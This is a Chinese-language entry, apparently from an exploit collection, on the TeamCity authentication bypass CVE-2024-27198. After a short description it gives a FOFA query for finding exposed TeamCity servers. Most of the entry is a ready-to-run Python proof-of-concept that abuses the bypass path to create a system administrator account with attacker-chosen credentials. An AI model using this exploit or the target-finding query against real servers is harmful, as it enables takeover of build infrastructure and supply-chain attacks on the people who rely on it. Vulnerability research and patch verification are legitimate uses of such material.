## JetBrains TeamCity 身份验证绕过漏洞(CVE-2024-27198)

JetBrains TeamCity发布新版本修复了两个高危漏洞JetBrains TeamCity 身份验证绕过漏洞(CVE-2024-27198)与JetBrains TeamCity 路径遍历漏洞(CVE-2024-27199)。未经身份验证的远程攻击者利用CVE-2024-27198可以绕过系统身份验证，创建管理员账户，完全控制所有TeamCity项目、构建、代理和构件，为攻击者执行供应链攻击。远程攻击者利用该漏洞能够绕过身份认证在系统上执行任意代码。

## fofa
```
body="Log in to TeamCity"
```

## poc
```python
import requests
import urllib3
import argparse
import re
urllib3.disable_warnings()
 
parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target",required=True, help="Target TeamCity Server URL")
parser.add_argument("-u", "--username", required=True,help="Insert username for the new user")
parser.add_argument("-p", "--password",required=True, help="Insert password for the new user")
args = parser.parse_args()
 
vulnerable_endpoint = "/pwned?jsp=/app/rest/users;.jsp" # Attacker’s path to exploit CVE-2024-27198, please refer to the Rapid7's blogpost for more information
 
def check_version():
    response = requests.get(args.target+"/login.html", verify=False) 
    repattern = r'<span class="vWord">Version</span>(.+?)</span>' # Regex pattern to extract the TeamCity version number
    try:
        version = re.findall(repattern, response.text)[0]
        print("[+] Version Found:", version)
    except:
        print("[-] Version not found")
 
def exploit():
    response = requests.get(args.target+vulnerable_endpoint, verify=False, timeout=10)
    http_code = response.status_code
    if http_code == 200:
        print("[+] Server vulnerable, returning HTTP", http_code) # HTTP 200 Status code is needed to confirm if the TeamCity Server is vulnerable to the auth bypass vuln
        create_user = {
            "username": args.username,
            "password": args.password,
            "email": f"{args.username}@mydomain.com",
            "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}, # Given admin permissions to your new user, basically you can have complete control of this TeamCity Server
        }
        headers = {"Content-Type": "application/json"}
        create_user = requests.post(args.target+vulnerable_endpoint, json=create_user, headers=headers, verify=False) # POST request to create the new user with admin privileges
        if create_user.status_code == 200:
            print("[+] New user", args.username, "created succesfully! Go to", args.target+"/login.html to login with your new credentials :)")
        else:
            print("[-] Error while creating new user")
 
    else:
        print("[-] Probable not vulnerable, returning HTTP", http_code) 
 
check_version()
exploit()
```
